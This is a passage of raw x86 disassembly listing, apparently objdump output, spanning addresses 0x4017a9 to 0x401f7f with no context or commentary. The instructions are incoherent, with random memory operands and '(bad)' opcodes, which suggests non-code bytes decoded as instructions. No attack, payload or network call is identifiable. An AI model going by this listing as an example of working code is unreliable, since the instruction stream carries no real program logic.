  4017a9:	adc    al,0x8
  4017ab:	sbb    al,0x60
  4017ad:	push   ecx
  4017ae:	and    DWORD PTR [esp+ecx*1],eax
  4017b1:	add    eax,0x80c40434
  4017b6:	enter  0x8401,0xa0
  4017ba:	mov    al,ds:0x306d6a
  4017bf:	nop
  4017c0:	add    al,BYTE PTR [eax+eiz*1+0x11]
  4017c4:	xor    DWORD PTR [esi+eax*1+0xb],eax
  4017c8:	add    al,0xbc
  4017ca:	add    DWORD PTR [esi],ecx
  4017cc:	shl    BYTE PTR [edx],0x22
  4017cf:	or     bh,bh
  4017d1:	adc    eax,0x4372c4
  4017d6:	sub    BYTE PTR [esi+0x5],0x8
  4017da:	lods   al,BYTE PTR ds:[esi]
  4017db:	add    BYTE PTR [edx],bl
  4017dd:	inc    eax
  4017de:	push   ecx
  4017df:	add    DWORD PTR [ebp-0x7c],ebp
  4017e2:	add    BYTE PTR [eax],0x2
  4017e5:	add    BYTE PTR [eax],dl
  4017e7:	pop    esp
  4017e8:	jecxz  0x401772
  4017ea:	adc    BYTE PTR [edi],ch
  4017ec:	xor    BYTE PTR [ebx+eax*1+0x45],al
  4017f0:	or     BYTE PTR [ebx],ah
  4017f2:	add    BYTE PTR [edx+0x32],al
  4017f5:	and    BYTE PTR [eax],cl
  4017f7:	sbb    DWORD PTR [ecx],0x441b5050
  4017fd:	add    al,0x4
  4017ff:	adc    dl,BYTE PTR [eax]
  401801:	or     BYTE PTR [esp+ecx*2+0x30],0x91
  401806:	and    BYTE PTR [eax+eiz*1+0x2eb000],al
  40180d:	adc    BYTE PTR [edx+eax*1],cl
  401810:	adc    DWORD PTR [eax],esp
  401812:	sbb    BYTE PTR [eax],dl
  401814:	mov    ecx,DWORD PTR [esi]
  401816:	adc    DWORD PTR [eax],edi
  401818:	and    DWORD PTR [eax+0x72],0x28e94909
  40181f:	adc    dh,BYTE PTR [edi]
  401821:	cmp    eax,0x71e051
  401826:	push   ecx
  401827:	mov    DWORD PTR [edx+0x8],esp
  40182a:	or     BYTE PTR [ecx+0x14],ch
  40182d:	and    dh,bl
  40182f:	add    dh,BYTE PTR [eax]
  401831:	or     al,0x1a
  401833:	xchg   ecx,eax
  401834:	xor    DWORD PTR [edx],0x63020039
  40183a:	ret    0x1d43
  40183d:	and    al,0x50
  40183f:	add    BYTE PTR [eax+0x9],al
  401842:	sbb    BYTE PTR [edi],dl
  401844:	sbb    DWORD PTR [ecx],ecx
  401846:	inc    eax
  401847:	add    al,BYTE PTR ds:0x201a8322
  40184d:	add    DWORD PTR [eax+0x50001680],esi
  401853:	mov    al,ds:0x40a20440
  401858:	cs inc eax
  40185a:	adc    al,0x90
  40185c:	add    DWORD PTR [eax+0x44410481],eax
  401862:	add    BYTE PTR fs:[edx],al
  401865:	test   BYTE PTR [edi],al
  401867:	add    al,0xc2
  401869:	or     BYTE PTR [eax],al
  40186b:	inc    ecx
  40186c:	sbb    al,al
  40186e:	mov    BYTE PTR [edi+0x40],al
  401871:	dec    ebx
  401872:	add    BYTE PTR [eax+0x26928314],al
  401878:	and    BYTE PTR [eax],al
  40187a:	js     0x40183e
  40187c:	rcl    al,0x8e
  40187f:	add    BYTE PTR [eax+edi*1],ah
  401882:	inc    esp
  401883:	add    BYTE PTR [eax-0x2f6dffc0],al
  401889:	and    DWORD PTR [eax],eax
  40188b:	test   BYTE PTR [ecx-0x7c],al
  40188e:	add    BYTE PTR [edx+0x4662200],ah
  401894:	and    DWORD PTR [eax+edx*1],eax
  401897:	add    DWORD PTR [ebp+0x9],edx
  40189a:	adc    dl,BYTE PTR [ecx+eax*1]
  40189d:	add    DWORD PTR [edx-0x7f],ecx
  4018a0:	sbb    BYTE PTR [eax],0x8
  4018a3:	or     DWORD PTR [esi+eax*1-0x6a],eax
  4018a7:	adc    DWORD PTR [edx+0x4c],ecx
  4018aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018ab:	add    BYTE PTR [eax-0x3e],dh
  4018ae:	xchg   cl,ah
  4018b0:	and    DWORD PTR [eax+0x29],0x49212c0a
  4018b7:	mov    al,ds:0xcc26f100
  4018bc:	add    BYTE PTR [edx],al
  4018be:	add    DWORD PTR [eax],edx
  4018c0:	push   ecx
  4018c1:	adc    eax,DWORD PTR [ecx+0x1d100210]
  4018c7:	ret    0x100
  4018ca:	nop
  4018cb:	and    BYTE PTR [eax],ch
  4018cd:	cwde   
  4018ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018cf:	xor    BYTE PTR [ecx],cl
  4018d1:	adc    DWORD PTR [eax+0x44],edx
  4018d4:	pop    edx
  4018d5:	sub    BYTE PTR [ebx+0x20601006],cl
  4018db:	and    BYTE PTR [eax+eax*4+0x2048071],0x11
  4018e3:	or     BYTE PTR gs:[ecx+0x2a248a3],al
  4018ea:	cmp    BYTE PTR [eax+0x8010],cl
  4018f0:	add    BYTE PTR [eax+ecx*1+0x1],0x0
  4018f5:	sbb    BYTE PTR [esi],al
  4018f7:	add    ah,cl
  4018f9:	sbb    BYTE PTR [ecx+0x40300000],ah
  4018ff:	inc    esp
  401900:	int3   
  401901:	mov    dl,0x43
  401903:	xor    al,0x91
  401905:	sub    BYTE PTR [edx],al
  401907:	add    BYTE PTR [eax],cl
  401909:	and    dh,ah
  40190b:	add    eax,0x104010a0
  401910:	or     al,0xf0
  401912:	mov    al,ds:0x50c038
  401917:	add    cl,BYTE PTR [eax]
  401919:	or     al,0x42
  40191b:	xor    BYTE PTR [eax],al
  40191d:	add    al,0x27
  40191f:	add    BYTE PTR [edx],0x4
  401922:	dec    ebx
  401923:	inc    ecx
  401924:	and    cl,BYTE PTR [edx]
  401926:	adc    DWORD PTR [ecx],esp
  401928:	jp     0x401932
  40192a:	dec    eax
  40192b:	add    eax,esp
  40192d:	add    DWORD PTR [ebx-0x7f7fef8f],edx
  401933:	push   eax
  401934:	add    al,0x44
  401936:	and    eax,0x28e10002
  40193b:	add    BYTE PTR [ebx],dl
  40193d:	rcl    BYTE PTR [edx+0x431601c4],0x3
  401944:	pusha  
  401945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401946:	and    ecx,DWORD PTR [esi]
  401948:	mov    ds:0x52400090,al
  40194d:	and    DWORD PTR [eax],0x1009510e
  401953:	add    al,0x1
  401955:	mov    BYTE PTR [eax],ah
  401957:	inc    eax
  401958:	or     BYTE PTR [edx],al
  40195a:	add    DWORD PTR [ecx],ecx
  40195c:	sbb    al,0x84
  40195e:	pop    ss
  40195f:	or     BYTE PTR [esi+0x805a0b0],ah
  401965:	add    al,BYTE PTR [eax]
  401967:	or     BYTE PTR [ecx],dl
  401969:	xchg   edx,eax
  40196a:	xchg   BYTE PTR [esi+eax*1+0x8185309],bl
  401971:	add    esp,DWORD PTR [eax]
  401973:	add    BYTE PTR [eax],cl
  401975:	mov    ecx,0x128020
  40197a:	or     al,0x82
  40197c:	inc    edx
  40197d:	add    BYTE PTR [eax+0x20d414],cl
  401983:	or     DWORD PTR [eax+eiz*1],eax
  401986:	push   eax
  401987:	sub    DWORD PTR [eax],edx
  401989:	push   esp
  40198a:	mov    ds:0x60d06000,al
  40198f:	inc    esp
  401990:	or     BYTE PTR ds:0x8e444002,al
  401996:	add    DWORD PTR [eax+0x20221d00],eax
  40199c:	adc    ebp,DWORD PTR [ecx]
  40199e:	sub    BYTE PTR [eax],al
  4019a0:	or     BYTE PTR [esp+eax*1],0x1
  4019a4:	add    eax,DWORD PTR [eax]
  4019a6:	and    BYTE PTR [eax],cl
  4019a8:	dec    eax
  4019a9:	adc    DWORD PTR [edi],esp
  4019ab:	adc    BYTE PTR [ecx+0x4c],al
  4019ae:	rol    dl,1
  4019b0:	shr    BYTE PTR [eax-0x7bfefcde],0x0
  4019b7:	add    BYTE PTR [eax],dl
  4019b9:	xor    BYTE PTR [esi],ah
  4019bb:	mov    BYTE PTR [eax],al
  4019bd:	data16 or bl,BYTE PTR ds:0x1003080
  4019c4:	add    BYTE PTR [eax],0x0
  4019c7:	and    BYTE PTR [edx+0x62],0x40
  4019cb:	cmp    DWORD PTR [edx+eiz*2],eax
  4019ce:	adc    BYTE PTR [ecx],al
  4019d0:	add    al,0xc0
  4019d2:	or     al,BYTE PTR [eax+0x6d418b2]
  4019d8:	adc    BYTE PTR [eax],bl
  4019da:	add    BYTE PTR [eax],ah
  4019dc:	mov    BYTE PTR [ecx+0x13000218],cl
  4019e2:	add    ch,BYTE PTR [eax]
  4019e4:	adc    al,0x40
  4019e6:	imul   esi,DWORD PTR [eax],0x21396a10
  4019ec:	push   cs
  4019ed:	xchg   ecx,eax
  4019ee:	pop    es
  4019ef:	xchg   BYTE PTR es:[ecx+0x9],dl
  4019f3:	or     BYTE PTR [ecx+0x2],al
  4019f6:	or     BYTE PTR [edi-0x1f5fdffa],al
  4019fc:	fld    DWORD PTR [ebx+eax*1+0x8101198]
  401a03:	dec    eax
  401a04:	inc    eax
  401a05:	push   edx
  401a06:	adc    ah,al
  401a08:	and    al,0x11
  401a0a:	add    BYTE PTR [eax+edx*2],al
  401a0d:	ret    0x2028
  401a10:	and    BYTE PTR [ebx],ch
  401a12:	or     bl,BYTE PTR [eax]
  401a14:	add    al,BYTE PTR [eax+0x28190000]
  401a1a:	shl    DWORD PTR [edx],1
  401a1c:	add    BYTE PTR [ebp+eiz*1-0x60],al
  401a20:	adc    al,BYTE PTR [edx]
  401a22:	add    BYTE PTR [ebx+0x42],al
  401a25:	dec    eax
  401a26:	inc    ecx
  401a27:	shl    BYTE PTR [ecx+0x48],cl
  401a2a:	fnstenv ds:0x58163003
  401a30:	sub    BYTE PTR [eax+0x24932a2],cl
  401a36:	dec    esi
  401a37:	and    esi,DWORD PTR [edx]
  401a39:	test   al,0x80
  401a3b:	add    eax,DWORD PTR [edx]
  401a3d:	rol    BYTE PTR [eax+eax*1],0x78
  401a41:	fiadd  DWORD PTR es:[esi]
  401a44:	adc    al,0x14
  401a46:	or     BYTE PTR [edi],0x1
  401a49:	xor    BYTE PTR [eax+0x1808e22],al
  401a4f:	mov    al,ds:0x286f4600
  401a54:	adc    al,0xc1
  401a56:	cwde   
  401a57:	sbb    al,BYTE PTR [ecx+0x0]
  401a5a:	adc    BYTE PTR [esi],0xc
  401a5d:	or     al,0x50
  401a5f:	or     DWORD PTR [esp+eax*4+0x0],edx
  401a63:	out    dx,al
  401a64:	dec    edx
  401a65:	adc    BYTE PTR [eax],dl
  401a67:	adc    BYTE PTR [eax-0x70],0x4
  401a6b:	inc    esp
  401a6c:	add    BYTE PTR [edx+0x2054092],al
  401a72:	add    DWORD PTR [ebx+0x4523018],0x8620880
  401a7c:	add    DWORD PTR [eax+eax*4],eax
  401a7f:	adc    BYTE PTR [ecx],al
  401a81:	add    DWORD PTR [eax-0x5c],0xc00262a6
  401a88:	test   BYTE PTR [edx+eiz*4],cl
  401a8b:	add    DWORD PTR [edi+0x68],eax
  401a8e:	inc    edx
  401a8f:	and    al,BYTE PTR [eax]
  401a91:	and    BYTE PTR [ebp+eax*1+0x50],dl
  401a95:	test   BYTE PTR [eax+0x781094c],ch
  401a9b:	xor    al,BYTE PTR [eax]
  401a9d:	inc    eax
  401a9e:	add    al,0x0
  401aa0:	xor    BYTE PTR [ecx],ah
  401aa2:	or     BYTE PTR [ebx],al
  401aa4:	or     BYTE PTR [eax+0x2],0x8
  401aa8:	or     BYTE PTR [eax+0x8],ah
  401aab:	add    BYTE PTR [eax+0x2068],dh
  401ab1:	xor    al,0x24
  401ab3:	rol    BYTE PTR [ecx+0x32],0xe8
  401ab7:	mov    al,ds:0x42105440
  401abc:	add    BYTE PTR [esi+0x1],cl
  401abf:	add    BYTE PTR [ecx+0x66],0x30
  401ac3:	inc    edx
  401ac4:	ret    
  401ac5:	test   DWORD PTR [edx],eax
  401ac7:	mov    eax,ds:0x392a4042
  401acc:	shr    BYTE PTR [eax+0x38],1
  401acf:	sbb    DWORD PTR [eax],0x80003050
  401ad5:	add    eax,DWORD PTR [ecx]
  401ad7:	add    cl,ah
  401ad9:	sub    al,0x30
  401adb:	sub    BYTE PTR [eax],cl
  401add:	cld    
  401ade:	add    BYTE PTR [eax+0x6],cl
  401ae1:	add    cl,al
  401ae3:	nop
  401ae4:	sub    BYTE PTR [eax+eax*1],cl
  401ae7:	push   edi
  401ae8:	sub    eax,0x5c00a4
  401aed:	push   eax
  401aee:	add    BYTE PTR [ecx],bl
  401af0:	adc    BYTE PTR [ebx+0x61],dl
  401af3:	adc    BYTE PTR [eax],0x1b
  401af6:	mov    DWORD PTR ss:[eax+0x1020111],ecx
  401afd:	les    eax,FWORD PTR [eax]
  401aff:	inc    ebx
  401b00:	add    DWORD PTR [eax],ebx
  401b02:	dec    ecx
  401b03:	dec    eax
  401b04:	and    BYTE PTR [eax],0x6
  401b07:	sbb    DWORD PTR [edx+ecx*1-0x24f7ffdf],edx
  401b0e:	mov    cl,0x50
  401b10:	push   ds
  401b11:	or     DWORD PTR [ecx],esp
  401b13:	add    DWORD PTR [eax+ebp*1],0x18
  401b17:	pop    esi
  401b18:	or     BYTE PTR ds:0x28cf089a,al
  401b1e:	call   0x229:0x14004be3
  401b25:	test   DWORD PTR [edx+0x80ac00b],edx
  401b2b:	popa   
  401b2c:	push   eax
  401b2d:	and    BYTE PTR [edx],0x20
  401b30:	add    BYTE PTR ds:0x803d8009,al
  401b36:	mov    al,ds:0x600900d
  401b3b:	inc    ebp
  401b3c:	add    BYTE PTR [edx+0x688e6004],cl
  401b42:	dec    esp
  401b43:	add    al,al
  401b45:	mov    ds:0x8920021,al
  401b4a:	push   eax
  401b4b:	add    BYTE PTR [edx],al
  401b4d:	xchg   ebp,eax
  401b4e:	add    BYTE PTR [ecx],dl
  401b50:	inc    ebp
  401b51:	cmp    al,BYTE PTR ds:0x2bd095c
  401b57:	add    BYTE PTR [eax+eiz*4],al
  401b5a:	or     BYTE PTR [ebx+eax*4+0x122820e],al
  401b61:	add    al,BYTE PTR [edx+0x0]
  401b64:	and    BYTE PTR [edx],dh
  401b66:	add    DWORD PTR [eax+0x1614cae],edx
  401b6c:	and    BYTE PTR [eax],ch
  401b6e:	adc    al,al
  401b70:	dec    edx
  401b71:	add    al,0x80
  401b73:	inc    ecx
  401b74:	or     DWORD PTR [edx],eax
  401b76:	and    eax,0x1c910682
  401b7b:	enter  0x12c0,0xb1
  401b7f:	add    al,0x82
  401b81:	and    DWORD PTR [eax+0x2364429],edx
  401b87:	ret    0x1006
  401b8a:	and    al,0x11
  401b8c:	xor    al,0x42
  401b8e:	or     DWORD PTR [ecx+eiz*1],esp
  401b91:	add    BYTE PTR [eax],dh
  401b93:	add    BYTE PTR [eax],dl
  401b95:	add    BYTE PTR [eax-0x7363f7be],ah
  401b9b:	dec    edx
  401b9c:	and    BYTE PTR [eax],0x8
  401b9f:	and    DWORD PTR [eax],eax
  401ba1:	adc    BYTE PTR [eax-0x6fbd5bfa],al
  401ba7:	or     BYTE PTR [eax+edx*1-0x77dfab70],al
  401bae:	pop    ss
  401baf:	and    al,0x80
  401bb2:	test   BYTE PTR [ecx],al
  401bb4:	adc    DWORD PTR [edx+edx*4],eax
  401bb7:	push   es
  401bb8:	dec    ecx
  401bb9:	add    al,0x20
  401bbb:	and    ch,al
  401bbd:	add    BYTE PTR [edx+ecx*2],ah
  401bc0:	sub    DWORD PTR [eax],esp
  401bc2:	dec    eax
  401bc3:	mov    ah,0x80
  401bc5:	dec    edx
  401bc6:	adc    al,0x34
  401bc8:	inc    eax
  401bc9:	inc    eax
  401bca:	les    eax,FWORD PTR [eax+0x60]
  401bcd:	add    BYTE PTR [eax],dh
  401bcf:	mov    cl,0x88
  401bd1:	add    BYTE PTR [edx],cl
  401bd3:	or     al,0x63
  401bd5:	adc    BYTE PTR [eax],dl
  401bd7:	or     dl,BYTE PTR [esi-0x1fef3d16]
  401bdd:	sbb    BYTE PTR [eax+0x69330],al
  401be3:	adc    DWORD PTR [edx],eax
  401be5:	mov    eax,ds:0x4448b3ac
  401bea:	add    DWORD PTR [eax],esp
  401bec:	mov    DWORD PTR [ecx],eax
  401bee:	push   es
  401bef:	and    BYTE PTR [edx],al
  401bf1:	push   edi
  401bf2:	nop
  401bf3:	dec    esp
  401bf4:	add    BYTE PTR [ecx],cl
  401bf6:	mov    al,ds:0x501628a
  401bfb:	xor    eax,edx
  401bfd:	add    BYTE PTR [edx],dh
  401bff:	add    al,dl
  401c01:	add    ah,0x4
  401c04:	adc    cl,BYTE PTR [eax]
  401c06:	add    al,BYTE PTR [edx+0x35291b0a]
  401c0c:	and    al,0x8
  401c0e:	fadd   DWORD PTR [eax+0xa280540]
  401c14:	inc    eax
  401c15:	sbb    BYTE PTR [ecx-0x7b],ah
  401c18:	mov    BYTE PTR [edx+eax*1+0x0],al
  401c1c:	or     BYTE PTR [eax],dl
  401c1e:	popa   
  401c1f:	and    al,BYTE PTR [ecx+0x41]
  401c22:	rcl    BYTE PTR [eax+0x32],0x80
  401c26:	adc    esi,DWORD PTR [eax+edx*1+0x9]
  401c2a:	and    al,BYTE PTR [ecx+0x1808046e]
  401c30:	add    DWORD PTR [edx+0x8c08105],eax
  401c36:	adc    BYTE PTR [eax-0x60],ah
  401c39:	stos   BYTE PTR es:[edi],al
  401c3a:	adc    BYTE PTR [ebx],ah
  401c3c:	add    eax,DWORD PTR [eax+0x13c3a204]
  401c42:	mov    al,ds:0x1e006102
  401c47:	add    BYTE PTR [ebx+0x11],ah
  401c4a:	add    BYTE PTR [edx],0xc
  401c4d:	add    al,0xa0
  401c4f:	and    dl,BYTE PTR [edx]
  401c51:	add    BYTE PTR [edx+0x2],0x0
  401c55:	add    BYTE PTR [eax],al
  401c57:	adc    al,0x0
  401c59:	adc    BYTE PTR [ecx],dh
  401c5b:	cmp    BYTE PTR [eax+0x7158000],0x0
  401c62:	adc    BYTE PTR ds:0x4a01d52,dl
  401c68:	add    BYTE PTR [edx],ch
  401c6a:	mov    BYTE PTR [eax],dl
  401c6c:	push   es
  401c6d:	adc    al,0x0
  401c6f:	or     BYTE PTR [eax+0x0],al
  401c72:	push   ecx
  401c73:	add    al,0x0
  401c75:	add    al,0x28
  401c77:	adc    BYTE PTR [eax],al
  401c79:	push   es
  401c7a:	dec    eax
  401c7b:	add    BYTE PTR [ecx+0x41],0xd
  401c7f:	adc    esp,ecx
  401c81:	add    DWORD PTR [eax+eiz*1],0x70e44000
  401c88:	dec    esp
  401c89:	push   eax
  401c8a:	or     DWORD PTR [edx+ebp*1+0x45],edx
  401c8e:	inc    ebx
  401c8f:	dec    edx
  401c90:	or     BYTE PTR [eax+0x42],0x48
  401c94:	cwde   
  401c95:	cwde   
  401c96:	or     DWORD PTR [ebp-0x40],eax
  401c99:	and    BYTE PTR [ecx],0xc
  401c9c:	adc    al,0xa0
  401c9e:	add    BYTE PTR [eax],ah
  401ca0:	jo     0x401d04
  401ca2:	sub    BYTE PTR [ecx],cl
  401ca4:	jne    0x401ca7
  401ca6:	test   DWORD PTR [eax+eax*1],edx
  401ca9:	cmp    BYTE PTR [eax-0x3efcfdf0],al
  401caf:	add    al,0x10
  401cb1:	add    ecx,DWORD PTR [edx+0x48940020]
  401cb7:	rol    BYTE PTR [eax+edx*4],0x4
  401cbb:	push   edx
  401cbc:	fs dec eax
  401cbe:	add    al,0x2
  401cc0:	inc    eax
  401cc1:	adc    eax,0x4d00202a
  401cc6:	add    eax,0x11080028
  401ccb:	or     BYTE PTR [edx+0x0],al
  401cce:	add    BYTE PTR [eax],cl
  401cd0:	or     ah,BYTE PTR [edi-0x7777efbf]
  401cd6:	arpl   WORD PTR [eax-0x77f15e74],ax
  401cdc:	or     BYTE PTR [eax],cl
  401cde:	add    DWORD PTR [ecx],ebx
  401ce0:	loop   0x401d22
  401ce2:	sbb    DWORD PTR [edx],eax
  401ce4:	add    BYTE PTR [eax+0x1a],al
  401ce7:	dec    esp
  401ce8:	add    BYTE PTR [eax+0x4],ah
  401ceb:	and    ecx,DWORD PTR [ecx+0x39008002]
  401cf1:	shl    BYTE PTR [eax+0x8],0x12
  401cf5:	or     DWORD PTR [esi],eax
  401cf7:	add    BYTE PTR [eax],bl
  401cf9:	add    BYTE PTR [eax+0x60118848],dl
  401cff:	add    BYTE PTR [eax],al
  401d01:	jmp    0x81427e2f
  401d06:	adc    DWORD PTR [edx],0x112368de
  401d0c:	or     eax,0x150a039
  401d11:	adc    DWORD PTR [esp+ebp*1],0x20e30a18
  401d18:	dec    esp
  401d19:	sbb    DWORD PTR [edx+0x80b0154],eax
  401d1f:	inc    eax
  401d20:	mov    eax,ds:0xb1a4608
  401d25:	cwde   
  401d26:	adc    DWORD PTR [eax-0x20],esi
  401d29:	les    edx,FWORD PTR [eax]
  401d2b:	push   eax
  401d2c:	add    al,BYTE PTR [ecx+0xc9a48c1]
  401d32:	cmp    al,0xa
  401d34:	and    DWORD PTR [edx+0x21],esp
  401d37:	push   es
  401d38:	inc    eax
  401d39:	mov    eax,0x11828084
  401d3e:	xor    BYTE PTR [ecx+0x300b7008],cl
  401d44:	sub    BYTE PTR [eax+0x31000240],ah
  401d4a:	add    BYTE PTR [eax+eax*1-0x6faf2f80],ah
  401d51:	add    DWORD PTR [eax],edi
  401d53:	and    BYTE PTR [eax],al
  401d55:	add    BYTE PTR [ebx+0x23240],dh
  401d5b:	cmp    al,BYTE PTR [edx+0x38d20095]
  401d61:	pop    edx
  401d62:	add    DWORD PTR [esi],eax
  401d64:	sub    eax,0xf018382
  401d69:	sbb    BYTE PTR [eax-0x774eedf0],ah
  401d6f:	or     DWORD PTR [esi],esi
  401d71:	adc    ch,BYTE PTR [ecx+0x9]
  401d74:	and    BYTE PTR [ebp+0x30],ch
  401d77:	xchg   ecx,eax
  401d78:	sbb    BYTE PTR [eax+eiz*4],al
  401d7b:	xchg   DWORD PTR [ecx+ebp*1],edx
  401d7e:	dec    esp
  401d7f:	and    DWORD PTR [edx+0x10138628],esp
  401d85:	dec    edx
  401d86:	add    BYTE PTR [ecx],al
  401d88:	add    edx,ebp
  401d8a:	add    BYTE PTR [eax],al
  401d8c:	enter  0x601,0x84
  401d90:	or     DWORD PTR [esi],eax
  401d92:	and    al,0x84
  401d94:	sbb    eax,DWORD PTR [ecx+0xa04000]
  401d9a:	inc    ecx
  401d9b:	add    cl,al
  401d9d:	sbb    BYTE PTR [esi],al
  401d9f:	inc    eax
  401da0:	add    BYTE PTR [eax],ch
  401da2:	add    BYTE PTR [edx],al
  401da4:	xor    cl,BYTE PTR [edx]
  401da6:	add    BYTE PTR [eax],al
  401da8:	add    BYTE PTR [eax+0x7],al
  401dab:	add    BYTE PTR [edx+0x24],ah
  401dae:	adc    eax,0x280ef000
  401db3:	inc    esp
  401db4:	mov    BYTE PTR [esi],cl
  401db6:	and    BYTE PTR [esi+ebp*1-0x78],dl
  401dba:	or     BYTE PTR [edx],0x2
  401dbd:	add    DWORD PTR [esp+eax*4],esp
  401dc0:	add    BYTE PTR fs:[ecx+eax*8],0x6
  401dc5:	add    eax,DWORD PTR [edx]
  401dc7:	and    DWORD PTR [eax],ecx
  401dc9:	add    DWORD PTR [eax],edx
  401dcb:	adc    BYTE PTR [esi-0x1e6bdfef],0x8
  401dd2:	popa   
  401dd3:	adc    DWORD PTR [ebx],ecx
  401dd5:	adc    BYTE PTR [eax+0x4220140e],ch
  401ddb:	add    BYTE PTR [edx],dl
  401ddd:	inc    ebx
  401dde:	rol    BYTE PTR [eax],0x9
  401de1:	pop    esp
  401de2:	add    BYTE PTR [eax+edx*1],dh
  401de5:	nop
  401de6:	in     al,dx
  401de7:	test   al,0x1
  401de9:	and    al,0x28
  401deb:	or     BYTE PTR [esi+0x2606006],ah
  401df1:	dec    eax
  401df2:	in     eax,0x82
  401df4:	test   DWORD PTR [edx+0x18100240],ebp
  401dfa:	add    BYTE PTR [ebx],0x1
  401dfd:	inc    ecx
  401dfe:	pop    ecx
  401dff:	and    ah,BYTE PTR [ebx+0x61]
  401e02:	rcl    BYTE PTR [eax],1
  401e04:	inc    ebx
  401e05:	shl    BYTE PTR [ecx+0x50],0x22
  401e09:	xor    BYTE PTR [ecx+0xa],ch
  401e0c:	adc    BYTE PTR [ecx],0x58
  401e0f:	enter  0x3e20,0xa0
  401e13:	sar    cl,1
  401e15:	dec    eax
  401e16:	inc    eax
  401e17:	xor    esp,DWORD PTR [esi]
  401e19:	cmp    BYTE PTR [ebx],al
  401e1b:	pusha  
  401e1c:	test   al,0x4
  401e1e:	test   BYTE PTR [ecx+eax*1],cl
  401e21:	add    eax,eax
  401e23:	and    eax,0xb000170
  401e28:	push   ebx
  401e29:	inc    ecx
  401e2a:	add    edi,DWORD PTR [ecx+0x38]
  401e2d:	add    BYTE PTR [eax],dl
  401e2f:	inc    edx
  401e30:	add    BYTE PTR [ecx+eax*1],ch
  401e33:	adc    DWORD PTR [eax-0x45ed763c],ebp
  401e39:	and    BYTE PTR [edx],al
  401e3b:	add    BYTE PTR [eax+0x38010940],0x4
  401e42:	and    al,0x98
  401e44:	inc    ecx
  401e45:	add    BYTE PTR [edx],al
  401e47:	adc    BYTE PTR [ebx],al
  401e49:	inc    ecx
  401e4a:	fmul   DWORD PTR [eax]
  401e4c:	dec    ecx
  401e4d:	add    BYTE PTR [ecx+eax*1+0x44804148],dl
  401e54:	cmp    DWORD PTR [ebx],eax
  401e56:	add    BYTE PTR [eax],ah
  401e58:	(bad)  
  401e59:	jb     0x401e5b
  401e5b:	mov    ds:0x14940831,eax
  401e60:	test   BYTE PTR [ecx],dl
  401e62:	ins    BYTE PTR es:[edi],dx
  401e63:	jb     0x401e72
  401e65:	add    BYTE PTR [esi],cl
  401e67:	repnz xor BYTE PTR [ebx],0x40
  401e6b:	and    DWORD PTR [eax],ebx
  401e6d:	and    BYTE PTR [eax],al
  401e6f:	add    DWORD PTR [eax+0x22948048],0x74946003
  401e79:	and    BYTE PTR [edx],ah
  401e7b:	xor    al,dl
  401e7d:	or     DWORD PTR [esp+ebp*1+0x2],edx
  401e81:	sbb    DWORD PTR [eax],edx
  401e83:	inc    edx
  401e84:	dec    eax
  401e85:	push   eax
  401e86:	add    al,0x4
  401e88:	add    BYTE PTR ds:0xa0140544,bl
  401e8e:	or     BYTE PTR [eax+0x65b81082],al
  401e94:	and    ah,BYTE PTR [edx]
  401e96:	cs and ecx,esi
  401e99:	and    DWORD PTR [eax+0x9c00008],ebp
  401e9f:	daa    
  401ea0:	inc    esi
  401ea1:	add    BYTE PTR [esi],dl
  401ea3:	add    DWORD PTR [eax+eiz*1],eax
  401ea6:	or     al,0x5
  401ea8:	add    al,BYTE PTR [eax]
  401eaa:	nop
  401eab:	enter  0x50a0,0x8
  401eaf:	(bad)  
  401eb1:	inc    edx
  401eb2:	xor    cl,BYTE PTR [ecx+0x0]
  401eb5:	inc    esp
  401eb6:	add    al,0x38
  401eb8:	add    BYTE PTR [edx],bh
  401eba:	adc    BYTE PTR [edx],cl
  401ebc:	push   es
  401ebd:	xor    BYTE PTR [ecx],al
  401ebf:	adc    eax,0x24608a21
  401ec4:	add    al,0x20
  401ec6:	xchg   ecx,eax
  401ec7:	lds    eax,FWORD PTR [eax+ebx*1+0x10]
  401ecb:	and    al,0x20
  401ecd:	add    BYTE PTR [eax+0x513c0c8e],dh
  401ed3:	dec    esp
  401ed4:	js     0x401f2d
  401ed6:	and    BYTE PTR [eax-0x3ddfff80],ah
  401edc:	and    BYTE PTR [esi],cl
  401ede:	mov    ds:0x31c82327,al
  401ee3:	and    cl,BYTE PTR [ecx]
  401ee5:	add    DWORD PTR [edx+0x20408181],ebx
  401eeb:	adc    BYTE PTR [eax],ah
  401eed:	and    dl,BYTE PTR [edx]
  401eef:	push   0x144002a
  401ef4:	add    BYTE PTR [ecx+0xf406680],ah
  401efa:	xchg   ebp,eax
  401efb:	xor    BYTE PTR [ebp+0x8],0x0
  401eff:	pop    eax
  401f00:	add    al,0x1f
  401f02:	add    al,al
  401f04:	add    BYTE PTR ds:0x1204d892,al
  401f0a:	inc    edx
  401f0b:	dec    esi
  401f0c:	inc    eax
  401f0d:	push   es
  401f0e:	add    cl,BYTE PTR [eax]
  401f10:	sub    BYTE PTR [ecx+0x0],dl
  401f13:	add    al,0x83
  401f15:	add    dl,BYTE PTR [eax+0x50113280]
  401f1b:	add    BYTE PTR [edx],al
  401f1d:	mov    al,ds:0x8146843
  401f22:	add    DWORD PTR [edx+0x46100243],eax
  401f28:	add    al,dh
  401f2a:	xchg   edx,eax
  401f2b:	push   es
  401f2c:	sub    eax,0x1004400
  401f31:	adc    DWORD PTR [eax*1-0x5bc00000],0x42000205
  401f3c:	add    BYTE PTR [eax],bl
  401f3e:	dec    esp
  401f3f:	mov    ch,0x50
  401f41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f42:	and    al,BYTE PTR [ebx]
  401f44:	inc    eax
  401f45:	test   BYTE PTR [edx+eax*1-0x7e],cl
  401f49:	icebp  
  401f4a:	add    al,0x76
  401f4c:	or     BYTE PTR [eax],cl
  401f4e:	and    eax,0x862e81
  401f53:	and    BYTE PTR [eax],0x8
  401f56:	inc    eax
  401f57:	add    al,0x50
  401f59:	add    eax,0xa001a150
  401f5e:	dec    eax
  401f5f:	inc    edx
  401f60:	add    al,BYTE PTR [edx]
  401f62:	inc    eax
  401f63:	and    DWORD PTR [ebx],esp
  401f65:	inc    eax
  401f66:	add    BYTE PTR ds:0x11c20080,0x34
  401f6d:	adc    BYTE PTR [eax+0x40c02f48],ah
  401f73:	(bad)  
  401f74:	inc    esp
  401f75:	add    eax,0x2a281221
  401f7a:	les    eax,FWORD PTR [eax]
  401f7c:	add    al,BYTE PTR [eax+0x4]
  401f7f:	add    al,BYTE PTR [eax]
